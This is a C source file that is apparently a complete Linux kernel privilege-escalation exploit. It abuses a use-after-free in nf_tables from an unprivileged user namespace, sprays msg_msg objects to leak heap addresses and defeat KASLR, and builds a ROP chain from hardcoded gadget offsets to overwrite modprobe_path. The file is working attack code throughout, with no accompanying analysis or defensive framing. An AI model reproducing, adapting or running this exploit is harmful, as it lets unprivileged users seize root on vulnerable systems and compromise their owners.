#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sched.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <netinet/in.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <linux/netfilter/xt_AUDIT.h>

#include <libmnl/libmnl.h>

#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/object.h>
#include <libnftnl/set.h>
#include <libnftnl/expr.h>

#include <sys/wait.h>
#include <sys/msg.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define RUN_CALLBACKS(cb, data) /* INFO("  Running callbacks"); */ \
    while (rseq < seq) \
    { \
        if ((err = mnl_socket_recvfrom(mnl, buf, sizeof(buf))) <= 0) \
            break; \
        if ((err = mnl_cb_run(buf, err, rseq, mnl_socket_get_portid(mnl), cb, data)) < 0) \
        { \
            WARN("      Failed at sequence %d", rseq); \
            break; \
        } \
        rseq += err == 0; \
    } \

#define MSG_COUNT 1024

#define RHT_DEFERRED_WORKER 0x6ed6d0
#define KPTI_TRAMPOLINE (vmlinux + 0x10010f0 + 0x36) // swapgs_restore_regs_and_return_to_usermode + offset
#define MODPROBE_PATH (vmlinux + 0x208b980)
#define PUSH_RSI_JMP_RSI_OFF (vmlinux + 0xa275e8) // push rsi ; jmp qword ptr [rsi - 0x7f]
#define POP_RSP_R15_RET (vmlinux + 0xb9eae) // pop rsp ; pop r15 ; ret
#define POP_RSP_RET (vmlinux + 0x53820) // pop rsp ; ret
#define WRITE_ECX_TO_RAX_OFF (vmlinux + 0xc31c2) // mov dword ptr [rax - 0x7d], ecx ; ret
#define POP_RAX_RET (vmlinux + 0xbef84) // pop rax ; ret
#define POP_RCX_RET (vmlinux + 0x5f633) // pop rcx ; ret
#define POP_R12_RBP_RBX_RET (vmlinux + 0x97164) // pop r12 ; pop rbp ; pop rbx ; ret

struct list_head
{
	struct list_head *next, *prev;
};

struct nft_rule
{
    struct list_head list;
    uint64_t handle : 42;
    uint64_t genmask : 2;
    uint64_t dlen : 12;
    uint64_t udata : 1;
    uint8_t data[];
};

struct msg_msg
{
	struct list_head m_list;
	long m_type;
	size_t m_ts;
	struct msg_msgseg *next;
	void *security;
};

struct msg_msgseg
{
	struct msg_msgseg *next;
};

typedef struct mnl_socket mnl_socket;
typedef struct mnl_nlmsg_batch mnl_batch;

typedef struct nftnl_table table;
typedef struct nftnl_chain chain;
typedef struct nftnl_rule rule;
typedef struct nftnl_expr expr;
typedef struct nftnl_obj obj;

typedef struct nlmsghdr nlmsghdr;
typedef struct nfgenmsg nfgenmsg;

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_sp;
char **env;

mnl_socket *mnl;

int seq, uaf_counter, msgid[MSG_COUNT];
char uaf_table_name[8];
uint64_t nft_counter, vmlinux, table_addr, obj_addr, obj_udata;

void monke()
{
    INFO("Return to monke");
    exit(0);
}

void fork_for_monke()
{
    pid_t pid;

    INFO("Forking to hold namespace");

    if ((pid = fork()) == 0)
    {
        setsid();
        close(0);
        close(1);
        close(2);
        while (1)
            sleep(1000);
    }
}

void save_state()
{
    __asm__
    (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    INFO("Saved state");
}

int setup()
{
    cpu_set_t set;

    INFO("Setting up namespace sandbox");

    if (unshare(CLONE_NEWUSER) == -1)
    {
        ERROR("unshare(CLONE_NEWUSER");
        return -1;
    }

    if (unshare(CLONE_NEWNET) == -1)
    {
        ERROR("unshare(CLONE_NEWNET)");
        return -1;
    }

    INFO("Set process affinity");

    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
    {
        ERROR("sched_setaffinity");
        return -1;
    }

    INFO("Initialize message queues");
    for (int i = 0; i < MSG_COUNT; ++i)
    {
        if ((msgid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0)
        {
            ERROR("msgget");
            return -1;
        }
    }

    return 0;
}

int request_compat(struct mnl_socket *nl, const char *name, uint32_t rev, uint32_t type)
{
    int err = 0, rseq;
    nlmsghdr *hdr;
    nfgenmsg *msg;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    INFO("Requesting compat module: %s", name);

    hdr = mnl_nlmsg_put_header(buf);
    hdr->nlmsg_type = (NFNL_SUBSYS_NFT_COMPAT << 8) | NFNL_MSG_COMPAT_GET;
    hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    hdr->nlmsg_seq = rseq = seq++;

    msg = mnl_nlmsg_put_extra_header(hdr, sizeof(*msg));
    msg->nfgen_family = AF_INET;
    msg->version = NFNETLINK_V0;
    msg->res_id = 0;

    mnl_attr_put_strz(hdr, NFTA_COMPAT_NAME, name);
    mnl_attr_put_u32(hdr, NFTA_COMPAT_REV, htonl(rev));
    mnl_attr_put_u32(hdr, NFTA_COMPAT_TYPE, htonl(type));

    mnl_socket_sendto(nl, hdr, hdr->nlmsg_len);

    RUN_CALLBACKS(NULL, NULL);

    return err;
}

int trigger_uaf(char *udata, uint32_t udlen, int basechain)
{
    int err = 0, rseq;
    table *t;
    chain *c1, *c2, *c3;
    rule *r1, *r2;
    expr *e;
    mnl_batch *b;
    nlmsghdr *hdr;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct xt_audit_info *audit_info;

    INFO("  Triggering Use-After-Free");

    sprintf(uaf_table_name, "uaf%d", ++uaf_counter);

    t = nftnl_table_alloc();
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, uaf_table_name);
    if (udata)
        nftnl_table_set_data(t, NFTNL_TABLE_USERDATA, udata, udlen);

    c1 = nftnl_chain_alloc();
    nftnl_chain_set_str(c1, NFTNL_CHAIN_TABLE, uaf_table_name);
    nftnl_chain_set_str(c1, NFTNL_CHAIN_NAME, "c1");
    nftnl_chain_set_u32(c1, NFTNL_CHAIN_ID, 0x1337);

    c2 = nftnl_chain_alloc();
    nftnl_chain_set_str(c2, NFTNL_CHAIN_TABLE, uaf_table_name);
    nftnl_chain_set_str(c2, NFTNL_CHAIN_NAME, "c2");
    if (basechain)
    {
        nftnl_chain_set_u32(c2, NFTNL_CHAIN_FLAGS, NFT_CHAIN_BASE);
        nftnl_chain_set_u32(c2, NFTNL_CHAIN_HOOKNUM, NF_INET_FORWARD);
        nftnl_chain_set_u32(c2, NFTNL_CHAIN_PRIO, 0);
    }

    c3 = nftnl_chain_alloc();
    nftnl_chain_set_str(c3, NFTNL_CHAIN_TABLE, uaf_table_name);
    nftnl_chain_set_str(c3, NFTNL_CHAIN_NAME, "c3");

    r1 = nftnl_rule_alloc();
    nftnl_rule_set_u32(r1, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r1, NFTNL_RULE_TABLE, uaf_table_name);
    nftnl_rule_set_str(r1, NFTNL_RULE_CHAIN, "c2");

    e = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_CHAIN_ID, 0x1337);
    nftnl_rule_add_expr(r1, e);

    // create table
    // create chain 1
    // delete chain 1
    // create chain 2
    //   create rule
    //     create immediate JUMP to c1 ====> c1->use = 1
    // create chain 3
    b = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin((char *)mnl_nlmsg_batch_current(b), seq++);
    mnl_nlmsg_batch_next(b);
    rseq = seq;

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_table_nlmsg_build_payload(hdr, t);
    mnl_nlmsg_batch_next(b);

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c1);
    mnl_nlmsg_batch_next(b);

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_DELCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c1);
    mnl_nlmsg_batch_next(b);

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c2);
    mnl_nlmsg_batch_next(b);

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r1);
    mnl_nlmsg_batch_next(b);

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c3);
    mnl_nlmsg_batch_next(b);

    nftnl_batch_end((char *)mnl_nlmsg_batch_current(b), seq);
    mnl_nlmsg_batch_next(b);

    mnl_socket_sendto(mnl, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
    mnl_nlmsg_batch_stop(b);

    RUN_CALLBACKS(NULL, NULL);

    if (err < 0)
        goto cleanup;

    r2 = nftnl_rule_alloc();
    nftnl_rule_set_u32(r2, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r2, NFTNL_RULE_TABLE, uaf_table_name);
    nftnl_rule_set_str(r2, NFTNL_RULE_CHAIN, "c3");

    audit_info = malloc(sizeof(struct xt_audit_info));
    audit_info->type = 0xff;
    e = nftnl_expr_alloc("target");
    nftnl_expr_set_str(e, NFTNL_EXPR_TG_NAME, "AUDIT");
    nftnl_expr_set_u32(e, NFTNL_EXPR_TG_REV, 0);
    nftnl_expr_set_data(e, NFTNL_EXPR_TG_INFO, audit_info, sizeof(struct xt_audit_info));
    nftnl_rule_add_expr(r2, e);

    // del rule
    // create compat expr
    b = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin((char *)mnl_nlmsg_batch_current(b), seq++);
    mnl_nlmsg_batch_next(b);
    rseq = seq;

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_DELRULE, NFPROTO_IPV4, NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r1);
    mnl_nlmsg_batch_next(b);

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r2);
    mnl_nlmsg_batch_next(b);

    nftnl_batch_end((char *)mnl_nlmsg_batch_current(b), seq);
    mnl_nlmsg_batch_next(b);

    mnl_socket_sendto(mnl, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
    mnl_nlmsg_batch_stop(b);

    RUN_CALLBACKS(NULL, NULL);
    err = 0;

    nftnl_rule_free(r2);

cleanup:
    nftnl_rule_free(r1);
    nftnl_chain_free(c3);
    nftnl_chain_free(c2);
    nftnl_chain_free(c1);
    nftnl_table_free(t);

    return err;
}

int spray_leak_heap_addr()
{
    int err = 0, rseq;
    rule *r;
    expr *e;
    obj *o;
    mnl_batch *b;
    nlmsghdr *hdr;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    INFO("  Spraying to leak heap address");

    o = nftnl_obj_alloc();
    nftnl_obj_set_u32(o, NFTNL_OBJ_FAMILY, NFPROTO_IPV4);
    nftnl_obj_set_str(o, NFTNL_OBJ_TABLE, uaf_table_name);
    nftnl_obj_set_u32(o, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
    nftnl_obj_set_str(o, NFTNL_OBJ_NAME, "o1");
    nftnl_obj_set_u32(o, NFTNL_OBJ_CTR_PKTS, 0);
    nftnl_obj_set_u32(o, NFTNL_OBJ_CTR_BYTES, 0);

    r = nftnl_rule_alloc();
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, uaf_table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, "c3");

    e = nftnl_expr_alloc("cmp");
    nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, NFT_REG32_00);
    nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
    nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_DATA, 0);
    nftnl_rule_add_expr(r, e);

    for (int i = 0; i < 5; ++i)
    {
        e = nftnl_expr_alloc("objref");
        nftnl_expr_set_u32(e, NFTNL_EXPR_OBJREF_IMM_TYPE, NFT_OBJECT_COUNTER);
        nftnl_expr_set_str(e, NFTNL_EXPR_OBJREF_IMM_NAME, "o1");
        nftnl_rule_add_expr(r, e);
    }

    for (int i = 0; i < 65; ++i)
    {
        // INFO("    Setting up batch");

        b = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin((char *)mnl_nlmsg_batch_current(b), seq++);
        mnl_nlmsg_batch_next(b);
        rseq = seq;

        if (i == 0)
        {
            hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
            nftnl_obj_nlmsg_build_payload(hdr, o);
            mnl_nlmsg_batch_next(b);
        }
        else for (int j = 0; j < 8; ++j)
        {
            hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
            nftnl_rule_nlmsg_build_payload(hdr, r);
            mnl_nlmsg_batch_next(b);
        }

        nftnl_batch_end((char *)mnl_nlmsg_batch_current(b), seq);
        mnl_nlmsg_batch_next(b);

        mnl_socket_sendto(mnl, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
        mnl_nlmsg_batch_stop(b);

        RUN_CALLBACKS(NULL, NULL);
    }

    nftnl_obj_free(o);
    nftnl_rule_free(r);

    return err;
}

int spray_fake_chain_addr(uint64_t addr)
{
    int err = 0;
    char udata[sizeof(long) + 0x80 - sizeof(struct msg_msg)];

    INFO("  Spraying to leak data at 0x%lx", addr);

    memset(udata, 0, sizeof(udata));
    *(uint64_t *)udata = 2;
    *(uint64_t *)(udata + sizeof(long) + 0x58 - sizeof(struct msg_msg)) = addr;

    for (int i = 0; i < MSG_COUNT; ++i)
    {
        if ((err = msgsnd(msgid[i], udata, sizeof(udata) - sizeof(long), 0)) < 0)
            break;
    }

    return err;
}

int leak_vmlinux_expr_cb(expr *e, void *dat)
{
    const char *data;

    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    vmlinux = *(uint64_t *)data - RHT_DEFERRED_WORKER;
    INFO("vmlinux = 0x%lx", vmlinux);

    return MNL_CB_OK;
}

int leak_heap_expr_cb(expr *e, void *dat)
{
    const char *data;

    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    table_addr = *(uint64_t *)data - 0xb8;
    INFO("table_addr = 0x%lx", table_addr);

    return MNL_CB_OK;
}

int leak_obj_expr_cb(expr *e, void *dat)
{
    const char *data;

    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    obj_addr = *(uint64_t *)data << 8lu;
    INFO("obj_addr = 0x%lx", obj_addr);

    return MNL_CB_OK;
}

int leak_udata_expr_cb(expr *e, void *dat)
{
    const char *data;

    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    obj_udata = *(uint64_t *)data << 8lu;
    INFO("obj_udata = 0x%lx", obj_udata);

    return MNL_CB_OK;
}

int leak_cb(const nlmsghdr *nlh, void *data)
{
    rule *r;

    r = nftnl_rule_alloc();
    nftnl_rule_nlmsg_parse(nlh, r);

    nftnl_expr_foreach(r, data, NULL);

    nftnl_rule_free(r);

    return MNL_CB_OK;
}

int leak(mnl_cb_t cb, void *expr_cb)
{
    int err = 0, rseq;
    rule *r;
    nlmsghdr *hdr;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    INFO("  Leaking data");

    r = nftnl_rule_alloc();
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, uaf_table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, "c2");

    rseq = seq;

    hdr = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);

    mnl_socket_sendto(mnl, buf, hdr->nlmsg_len);

    RUN_CALLBACKS(cb, expr_cb);

    nftnl_rule_free(r);

    return err;
}

int stage_1()
{
    INFO("Stage 1: Leak table address");

    if (trigger_uaf(NULL, 0, 0))
        return -1;

    if (spray_leak_heap_addr())
        return -1;

    return leak(leak_cb, leak_heap_expr_cb);
}

int stage_2()
{
    INFO("Stage 2: Defeat KASLR");

    if (trigger_uaf(NULL, 0, 0))
        return -1;

    if (spray_fake_chain_addr(table_addr + 0x68))
        return -1;

    return leak(leak_cb, leak_vmlinux_expr_cb);
}

int make_object(char *name, char *udata, uint32_t udlen, int need_leak)
{
    int err = 0, rseq;
    obj *o;
    mnl_batch *b;
    nlmsghdr *hdr;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    o = nftnl_obj_alloc();
    nftnl_obj_set_u32(o, NFTNL_OBJ_FAMILY, NFPROTO_IPV4);
    nftnl_obj_set_str(o, NFTNL_OBJ_TABLE, "uaf1");
    nftnl_obj_set_u32(o, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
    nftnl_obj_set_str(o, NFTNL_OBJ_NAME, name);
    nftnl_obj_set_u32(o, NFTNL_OBJ_CTR_PKTS, 0);
    nftnl_obj_set_u32(o, NFTNL_OBJ_CTR_BYTES, 0);
    nftnl_obj_set_data(o, NFTNL_OBJ_USERDATA, udata, udlen);

    b = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin((char *)mnl_nlmsg_batch_current(b), seq++);
    mnl_nlmsg_batch_next(b);
    rseq = seq;

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_obj_nlmsg_build_payload(hdr, o);
    mnl_nlmsg_batch_next(b);

    nftnl_batch_end((char *)mnl_nlmsg_batch_current(b), seq);
    mnl_nlmsg_batch_next(b);

    mnl_socket_sendto(mnl, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
    mnl_nlmsg_batch_stop(b);

    RUN_CALLBACKS(NULL, NULL);

    nftnl_obj_free(o);

    if (err < 0)
        return err;

    if (need_leak)
    {
        INFO("  Leak object address");

        if (trigger_uaf(NULL, 0, 0))
            return -1;

        if (spray_fake_chain_addr(table_addr + 0xc1))
            return -1;

        if (leak(leak_cb, leak_obj_expr_cb))
            return -1;

        INFO("  Leak object udata address");

        if (trigger_uaf(NULL, 0, 0))
            return -1;

        if (spray_fake_chain_addr(obj_addr + 0x49))
            return -1;

        if (leak(leak_cb, leak_udata_expr_cb))
            return -1;
    }

    return 0;
}

int stage_3()
{
    char udata[256];
    uint64_t *rop;

    INFO("Stage 3: Prepare expr ops and ROP");

    memset(udata, 0, sizeof(udata));
    *(uint32_t *)udata = 0x68;
    *(uint64_t *)&udata[0x8] = PUSH_RSI_JMP_RSI_OFF;

    rop = (uint64_t *)&udata[0x10];

    *rop++ = POP_RAX_RET;
    *rop++ = MODPROBE_PATH + 0x7d;

    *rop++ = POP_R12_RBP_RBX_RET;
    rop++;
    rop++;
    rop++;

    *rop++ = POP_RCX_RET;
    *rop++ = 0x706d742f;
    *rop++ = WRITE_ECX_TO_RAX_OFF;
    *rop++ = POP_RAX_RET;
    *rop++ = MODPROBE_PATH + 0x7d + 0x4;
    *rop++ = POP_RCX_RET;
    *rop++ = 0x782f;
    *rop++ = WRITE_ECX_TO_RAX_OFF;

    *rop++ = KPTI_TRAMPOLINE;
    rop++;
    rop++;
    *rop++ = (uint64_t)monke;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;

    return make_object("o2", udata, sizeof(udata), 1);
}

int stage_4()
{
    char udata[256];
    struct nft_rule *r = (struct nft_rule *)udata;
    uint64_t *rop;

    INFO("Stage 4: Prepare fake rule for ROP");

    memset(udata, 0, sizeof(udata));
    *(uint64_t *)&udata[1] = POP_RSP_R15_RET;
    r->dlen = 0xf0;
    *(uint64_t *)(r->data) = obj_udata - 0x10;
    *(uint64_t *)(r->data + 0x68) = obj_udata - 0x40;

    rop = (uint64_t *)(r->data + 0x70);
    *rop++ = POP_RSP_RET;
    *rop++ = obj_udata + 0x10;

    return make_object("o3", udata, sizeof(udata), 1);
}

int stage_5()
{
    int err = 0, rseq;
    rule *r;
    expr *e;
    mnl_batch *b;
    nlmsghdr *hdr;
    char udata[sizeof(long) + 0x1000 - sizeof(struct msg_msg) + 0x80 - sizeof(struct msg_msgseg)];
    char buf[MNL_SOCKET_BUFFER_SIZE];

    INFO("Stage 5: Trigger ROP");

    if (trigger_uaf(NULL, 0, 1))
        return -1;

    *(uint64_t *)udata = 1;
    *(uint64_t *)(udata + sizeof(long) + 0x1000 - sizeof(struct msg_msg) + 0x8) = obj_udata;

    for (int i = 0; i < MSG_COUNT; ++i)
        msgsnd(msgid[i], udata, sizeof(udata) - sizeof(long), 0);

    INFO("  Calling validate");

    r = nftnl_rule_alloc();
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, uaf_table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, "c2");

    e = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_RETURN);
    nftnl_rule_add_expr(r, e);

    b = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin((char *)mnl_nlmsg_batch_current(b), seq++);
    mnl_nlmsg_batch_next(b);
    rseq = seq;

    hdr = nftnl_nlmsg_build_hdr((char *)mnl_nlmsg_batch_current(b), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_ACK | NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    mnl_nlmsg_batch_next(b);

    nftnl_batch_end((char *)mnl_nlmsg_batch_current(b), seq);
    mnl_nlmsg_batch_next(b);

    fork_for_monke();

    mnl_socket_sendto(mnl, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
    mnl_nlmsg_batch_stop(b);

    RUN_CALLBACKS(NULL, NULL);

    return err;
}

int main(int argc, char **argv, char **envp)
{
    if (setup())
        return -1;

    env = envp;
    save_state();

    INFO("Opening netfilter socket");
    mnl = mnl_socket_open(NETLINK_NETFILTER);
    if (mnl == NULL)
    {
        ERROR("mnl_socket_open");
        return -1;
    }

    if (request_compat(mnl, "AUDIT", 0, 1))
    {
        ERROR("request_compat");
        goto end_mnl_socket;
    }

    if (stage_1())
    {
        ERROR("Stage 1");
        goto end_mnl_socket;
    }

    if (stage_2())
    {
        ERROR("Stage 2");
        goto end_mnl_socket;
    }

    if (stage_3())
    {
        ERROR("Stage 3");
        goto end_mnl_socket;
    }

    if (stage_4())
    {
        ERROR("Stage 4");
        goto end_mnl_socket;
    }

    if (stage_5())
    {
        ERROR("Stage 5");
        goto end_mnl_socket;
    }

end_mnl_socket:
    mnl_socket_close(mnl);
}
